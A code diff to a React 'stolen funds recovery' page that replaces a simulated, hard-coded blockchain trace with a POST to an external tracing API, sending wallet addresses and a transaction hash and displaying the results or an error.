@@ -30,23 +30,30 @@ export default function StolenFundsRecovery() {
 
   const handleQuickTrace = async () => {
     if (!formData.thiefWallet) return;
-    
+
     setLoading(true);
     try {
-      // Simulate blockchain analysis
-      setTimeout(() => {
-        setTraceResults({
-          address: formData.thiefWallet,
-          balance: '12.45 ETH',
-          transactions: 247,
-          exchanges: ['Binance', 'KuCoin'],
-          mixers: ['Tornado Cash'],
-          riskScore: 'High',
-          lastActivity: '2 hours ago'
-        });
-        setLoading(false);
-      }, 3000);
+      // Call real blockchain forensics API
+      const response = await fetch('https://autoclaimtoken.onrender.com/api/trace-stolen-funds', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          thiefWallet: formData.thiefWallet,
+          victimWallet: formData.victimWallet,
+          txHash: formData.txHash
+        })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        setTraceResults(data.traceResults);
+      } else {
+        alert(data.error || 'Failed to trace funds');
+      }
+      setLoading(false);
     } catch (error) {
+      alert('Failed to trace funds: ' + error.message);
       setLoading(false);
     }
   };
